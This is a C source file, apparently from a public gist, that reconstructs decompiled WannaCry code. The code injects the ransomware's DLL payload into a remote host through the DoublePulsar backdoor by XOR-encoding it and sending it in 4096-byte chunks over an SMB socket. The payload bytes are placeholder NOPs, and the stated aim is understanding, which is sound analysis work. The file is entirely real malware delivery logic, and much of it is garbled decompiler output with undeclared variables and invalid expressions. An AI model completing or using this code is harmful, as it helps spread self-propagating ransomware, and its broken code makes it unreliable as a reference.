//original: https://gist.github.com/msuiche/691e52fd5f0d8b760080640687e23d60

/* This is to help understand how Wannacry sends the DLL via DoublePulsar */

unsigned char DLLPayload64[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
int v4 = 4869; //Size of DLL Payload
char *v5 = (char *)&DLLPayload64;
char FileName[260]; //this is null on wannacry disassembly / decompiled

int v19;
char v16[9]; 

int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int XorKey)
{
	HGLOBAL hMem;
	hMem = GlobalAlloc(GMEM_ZEROINIT, (SIZE_T)&v5[v4 + 12]);

	v3 = *(const void **)&FileName[264];
	memcpy((char *)hMem + v4, FileName, (unsigned int)v5);

	if((signed int)&v5[v4] % 4 )
	{
		v19 = 4 * ((signed int)&v5[v4] / 4) + 4;
	}
	else
    	{
      		v19 = (int)&v5[v4];
    	}

	if ( architectureType )
    	{
	      	v7 = &unk_42E758;
	      	dword_42ECE9 = (int)(v5 + 3440);
	      	*(int *)((char *)&dword_42E750 + v4) = (int)v5;
	      	*(int *)((char *)&dword_42E754 + v4) = 1;
	      	v8 = v4;
    	}
    	else
    	{
	      	v7 = &unk_42FA60;
	      	dword_4302CE = (int)(v5 + 3978);
	      	*(int *)((char *)&dword_42FA58 + v4) = (int)v5;
	      	*(int *)((char *)&dword_42FA5C + v4) = 1;
	      	v8 = v4;
    	}
	memcpy(hMem, v7, v8);
	encodePacket(XorKey, (int)v6, v19);

	int v9 = v19 / 4096;
    	int v10 = v19 % 4096;
	
	memcpy(&buf, &unk_42E710, 70);

	int v11 = 0;

	if ( v19 / 4096 > 0 )
    	{
		for ( i = 0; ; v11 = i )
		{
			v[16] = __PAIR__(4096, v19);
			*(WORD*)v16[8] = v11;
			encodePacket(XorKey, (int)v16, 12);
			int v30 = *(DWORD*)&v16[8];
			memcpy(&v31, (char *)hMem + v11, 4096);
			send(s, &buf, 4178, 0);
			if ( recvbuff[34] != 82 ) // 0x52
          			break;
			v13 = __OFSUB__(v22 + 1, v9);
			v12 = v22++ + 1 - v9 < 0;
			i += 4096;
			if ( !(v12 ^ v13) )
				break;
		}
	}

	if ( v10 > 0 )
    	{
		v25 = htons(v10 + 78);
	      	v28 = v10 + 13;
	      	v14 = v9 << 12;
	      	v26 = v10;
	      	v27 = v10;
		v16 = __PAIR__(v10, v19);
		*(DWORD *)&v16[8] = v14;
		encodePacket(XorKey, (int)v16, 12);
		v30 = *(DWORD *)&v16[8];
      		v29 = *(DWORD *)v16;
		memcpy(&v31, (char *)hMem + v14, v10);
		send(s, &buf, v10 + 82, 0);
	}
	GlobalFree(hMem);
	return 0;
}
